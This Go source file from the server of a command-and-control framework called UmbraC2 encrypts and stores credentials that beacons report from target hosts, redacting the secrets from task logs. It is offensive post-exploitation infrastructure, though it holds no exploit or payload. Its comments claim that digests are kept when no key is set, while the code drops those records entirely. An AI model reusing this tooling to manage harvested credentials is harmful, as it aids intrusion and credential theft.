package hub

import (
	"crypto/rand"
	"crypto/sha256"
	"encoding/hex"
	"errors"
	"time"

	"github.com/thesyntax1/UmbraC2/server/internal/crypt"
	"github.com/thesyntax1/UmbraC2/server/internal/store"
	"github.com/thesyntax1/UmbraC2/server/internal/wire"
)

// The label that separates the vault key from every other key of the
// framework.  The same label is the additional data of the sealing, so a
// vault entry cannot be read as anything else.
const vaultLabel = "umbra/v1/vault"

// vaultKey derives the key of the credential vault.
//
// The key comes from the configuration.  Without one the server keeps the
// digest of the material and drops the secret itself: a secret on the disk
// in the clear is worse than no secret at all, and an operator who wants
// the material kept configures a key.
func (h *Hub) vaultKey() []byte {
	if h.cfg == nil {
		return nil
	}
	raw := h.cfg.Server.VaultKey
	if raw == "" {
		return nil
	}
	key := crypt.HkdfSHA256([]byte(raw), []byte(vaultLabel), []byte("credential"), 32)
	if len(key) != 32 {
		return nil
	}
	return key
}

// vaultSeal encrypts a secret for the vault.
//
// The nonce is random and travels in front of the ciphertext, so the same
// secret sealed twice does not look the same twice.
func (h *Hub) vaultSeal(plaintext string) (string, error) {
	key := h.vaultKey()
	if key == nil {
		return "", errors.New("the vault has no key: configure vault_key")
	}
	nonce := make([]byte, 12)
	if _, err := rand.Read(nonce); err != nil {
		return "", err
	}
	sealed, err := crypt.Seal(wire.SuiteAES256GCM, key, nonce, []byte(vaultLabel), []byte(plaintext))
	if err != nil {
		return "", err
	}
	return hex.EncodeToString(append(nonce, sealed...)), nil
}

// vaultOpen decrypts a secret of the vault.
//
// The server refuses to return anything when the key is wrong: a vault
// that answers with garbage is worse than a vault that says no.
func (h *Hub) vaultOpen(encoded string) (string, error) {
	key := h.vaultKey()
	if key == nil {
		return "", errors.New("the vault has no key: configure vault_key")
	}
	raw, err := hex.DecodeString(encoded)
	if err != nil {
		return "", err
	}
	if len(raw) < 12 {
		return "", errors.New("the vault entry is too short")
	}
	nonce, sealed := raw[:12], raw[12:]
	plaintext, err := crypt.Open(wire.SuiteAES256GCM, key, nonce, []byte(vaultLabel), sealed)
	if err != nil {
		return "", err
	}
	return string(plaintext), nil
}

// taskKind returns the kind of a task.
//
// The helpers that read a result need to know what produced it: the
// material of a "creds" task belongs in the vault, and the material of
// any other task is just output.
func (h *Hub) taskKind(taskID string) string {
	t, ok := h.store.Task(taskID)
	if !ok {
		return ""
	}
	return t.Kind
}

// VaultEncrypted reports whether the vault can open what it keeps.
//
// The console asks the server, so an operator knows before the export
// that the values are there or that they are not.
func (h *Hub) VaultEncrypted() bool {
	return h.vaultKey() != nil
}

// VaultOpen decrypts a secret of the vault.
func (h *Hub) VaultOpen(encoded string) (string, error) {
	return h.vaultOpen(encoded)
}

// credEntry is one piece of material as the beacon reported it.
type credEntry struct {
	Kind       string
	Source     string
	Account    string
	Target     string
	Confidence int
	Secret     string
	Note       string
}

// redactCredentials takes the secret out of the material of a result.
//
// The task record and the event stream keep the shape of the material and
// lose the value: the vault is the place for the value, and the vault is
// the place the operator asked for it.  The material that is returned is
// the material that goes into the vault.
func redactCredentials(kind string, meta map[string]any) ([]credEntry, bool) {
	if kind != "creds" || meta == nil {
		return nil, false
	}
	raw, ok := meta["creds"].([]any)
	if !ok {
		return nil, false
	}
	out := make([]credEntry, 0, len(raw))
	redacted := make([]any, 0, len(raw))
	for _, item := range raw {
		fields, ok := item.(map[string]any)
		if !ok {
			continue
		}
		entry := credEntry{
			Kind:       metaString(fields["kind"]),
			Source:     metaString(fields["source"]),
			Account:    metaString(fields["account"]),
			Target:     metaString(fields["target"]),
			Confidence: metaInt(fields["confidence"]),
			Secret:     metaString(fields["secret"]),
			Note:       metaString(fields["note"]),
		}
		if entry.Secret != "" {
			out = append(out, entry)
		}
		cp := make(map[string]any, len(fields))
		for k, v := range fields {
			cp[k] = v
		}
		cp["secret"] = ""
		cp["redacted"] = true
		redacted = append(redacted, cp)
	}
	meta["creds"] = redacted
	return out, true
}

// storeCredentials puts the material of a result into the vault.
//
// The secret is encrypted when the operator configured a key.  Without one
// the record keeps the digest and the shape of the material, so the
// operator still knows what was found and where, but the value is not kept
// anywhere.
func (h *Hub) storeCredentials(agentID string, entries []credEntry) {
	stored := 0
	dropped := 0
	for _, entry := range entries {
		sum := sha256.Sum256([]byte(entry.Secret))
		record := &store.Credential{
			AgentID:    agentID,
			Source:     entry.Source,
			Account:    entry.Account,
			Target:     entry.Target,
			Kind:       entry.Kind,
			Digest:     hex.EncodeToString(sum[:]),
			Confidence: entry.Confidence,
			Note:       entry.Note,
			Collected:  time.Now().UTC(),
		}
		sealed, err := h.vaultSeal(entry.Secret)
		if err != nil {
			dropped++
			continue
		}
		record.Secret = sealed
		h.store.AddCredential(record)
		stored++
	}
	h.Emit(Event{Kind: "creds.collected", AgentID: agentID, Data: map[string]any{
		"collected": stored,
		"dropped":   dropped,
	}})
}
